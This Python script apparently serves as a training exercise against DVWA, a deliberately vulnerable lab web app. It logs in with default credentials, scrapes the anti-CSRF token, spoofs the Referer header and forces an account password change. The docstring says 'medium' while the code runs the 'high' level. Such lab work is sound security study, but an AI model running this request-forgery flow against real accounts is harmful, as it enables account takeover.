#!../venvkali/bin/python3
# !--*--coding:utf-8--*--
__author__ = 'Cazin Christophe'

''' 
Role :  CSRF medium level on DVWA
        Connect to interface 
        Setup the medium level 
        Go to CSRF menu and launch a changing of password in changing the REFERER
        Only for DVWA Version 1.10 *Development* (Release date: 2015-10-08
        else you should adapt the soup filters 
'''
import requests
from termcolor import cprint
from bs4 import BeautifulSoup

# Declaration part
HOST_DVWA='172.16.13.1:81'  # Host where is DVWA
URI_DVWA='http://{}'.format(HOST_DVWA)
payload = {}
cookie = {}
# Password to change in the CSRF menu
new_password_csrf='password'


# Function part
print_ok = lambda x: cprint('# {} #'.format(x), 'green')
print_ko = lambda x: cprint('# {} #'.format(x), 'red' )
print_wh = lambda x: cprint('# {} #'.format(x), 'white' )


def main():
    # Create a session object to keep context in all requests
    # We will instance all requests object from this one
    global s
    s = requests.session()
    url = '{}/login.php'.format(URI_DVWA)
    get_cookie(url)
    if get_attributes(url):
        print_ok("get_attributes() done")
        if login_dvwa():
            if set_secu('high'):
                csrf_high(new_password_csrf)
    else:
        print_ko("get_attributes() done")
    s.close()

def get_attributes(url):
    # Do a first GET to grab PHPSESSID and user_token

    # Do a get just to take the hidden field in the log in page and cookie
    r = s.get(url)

    # Parsing into the log in page to get the hidden token
    # into r.text -° <input type=\'hidden\' name=\'user_token\' value=\'540d08899fd27226ac010b6c97fe91d8\' />
    soup = BeautifulSoup(r.text, 'html.parser')
    t = soup.find(attrs={'name': 'user_token'})
    if t:
        # Adding the token in paylod to inject in the post
        payload['user_token']=t['value']
        print_wh('payload = {}'.format(payload))

        return True
    else:
        print_ko('Error to soup the attributes')

def get_cookie(url):

    r = s.get(url)
    # Adding too the Sessiom ID
    # ['PHPSESSID=6vgc0cvb5o4c7b6kffmha2cfd6;', 'path=/,', 'PHPSESSID=6vgc0cvb5o4c7b6kffmha2cfd6;', 'path=/,', 'security=low']
    cookie[r.headers['Set-Cookie'].split()[0].split('=')[0]]=r.headers['Set-Cookie'].split()[0].split('=')[1]
    print_wh('cookie = {}'.format(cookie))

# Log in to DVWA platform
def login_dvwa():
    # Loading dic payload to send data on forms
    url = '{}/login.php'.format(URI_DVWA)

    payload['password'] = 'password'
    payload['username'] = 'admin'
    payload['Login'] = 'Login'

    WELCOME_BANNER='Welcome to Damn Vulnerable Web Application!'

    r = s.post(url, data=payload)
    if r.status_code == requests.codes.ok:
        # We are successfully logged
        if r.text.find(WELCOME_BANNER) != -1 :
            print_ok('Logged in to DVWA {} - status code : {}'.format(url,r.status_code))
            return True
        else:
            print_ko('Authentication error on DVWA {} - status code : {}'.format(r.url,r.status_code))



def set_secu(level):
    # Go to the DVWA Security menu and change level
    SEC_BANNER = 'Security level set to {}'.format(level)
    payload['security'] = level
    payload['seclev_submit'] = 'Submit'
    url = '{}/security.php'.format(URI_DVWA)

    r = s.post(url, data=payload )
    if r.status_code == requests.codes.ok:
        soup = BeautifulSoup(r.text, 'html.parser')
        t = soup.find(attrs={'class': 'message'})
        if t.get_text() == SEC_BANNER:
            print_ok('Security has been set to {}'.format(level))
            return True
        else:
            print_ko('Level {} semms to be not available')

def csrf_high(new_password_csrf):
    CSRF_BANNER='Password Changed.'
    url = '{}/vulnerabilities/csrf/'.format(URI_DVWA)
    header = { 'Referer': '{}/vulnerabilities/csrf/'.format(URI_DVWA) }

    # url for low or medium security mode , no need to provide the token
    #http://172.16.13.1:81/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#


    # Get the last user_token after login to inject in the get
    get_attributes(url)
    #print('## Stored user_token : {}'.format(payload['user_token']))

    url = '{0}?password_new={1}&password_conf={1}&Change=Change&user_token={2}'.format(url, new_password_csrf, payload['user_token'])
    print('url : {}'.format(url))

    r = s.get(url, headers= header)
    if r.status_code == requests.codes.ok:
        soup = BeautifulSoup(r.text, 'html.parser')
        if soup.find('pre').contents[0]  == CSRF_BANNER:
            print_ok('Password has been changed successfully')
            return True
        else:
            print_ko('Password has not been changed')

if __name__ == '__main__':
    main()
